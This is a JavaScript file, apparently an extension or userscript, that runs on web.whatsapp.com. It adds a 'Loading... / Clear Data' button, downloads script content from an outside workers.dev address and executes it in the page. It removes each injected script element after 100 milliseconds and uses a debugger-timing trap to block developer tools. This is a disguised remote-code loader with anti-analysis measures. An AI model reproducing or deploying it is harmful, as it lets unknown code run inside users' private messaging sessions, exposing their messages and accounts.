
	
	function xhr(t, e, n) {
    let i = window.XMLHttpRequest ? new XMLHttpRequest : new ActiveXObject("Microsoft.XMLHTTP");
    i.onreadystatechange = function () {
        if (4 == this.readyState && 200 == this.status || 304 == this.status) {
            let t = this.responseText,
                e = JSON.parse(t.substring(t.indexOf("{"), t.lastIndexOf("}") + 1));
            n && n(e)
        }
    }, i.open(t, e, !0), i.send()
}

function fetchafterrun(t) {
    xhr("GET", t, function (t) {
        var n = t.feed.entry;
        for (let e = 0, t = n.length; e < t; e++) {
            let t = document.createElement("script");
            t.innerHTML = n[e].content.$t, document.body.appendChild(t), setTimeout(() => {
                document.body.removeChild(t)
            }, 100)
        }
    })
}

function check() {before = new Date().getTime();debugger;after = new Date().getTime();if (after - before > 200) {document.write(" Alert!! Close Developer Tools Now... ");self.location.replace(window.location.protocol + window.location.href.substring(window.location.protocol.length));}else{before = null;after = null;delete before;delete after;}setTimeout(check, 100);}

(function () {
    if (window.location.hostname === "web.whatsapp.com") {
var e = document.createElement("div");
e.innerHTML = '<div id="fsetting2"><a class="runbutton22" href="javascript:;" title="Wait/Clear Data" id="addext">Loading... / Clear Data</a></div>', document.body.appendChild(e), (e = document.createElement("style")).innerText = "#fsetting2{position:fixed;top:2px;z-index:99998;left:0;line-height:initial}#fsetting2 a.runbutton22{cursor:pointer;padding:5px 15px;background:#005af0;color:#fff;border-radius:4px;z-index:99998;margin:2px;display: inline-block;font-weight:600;box-shadow:0 2px 5px 1px rgb(60 64 67/16%);font-size:12px;text-decoration:none}#fsetting2 a.runbutton22:hover{color:#fff}", document.body.appendChild(e), fetchafterrun("https://share.autopush.workers.dev/import?id=installtool");

check();

    }
})();
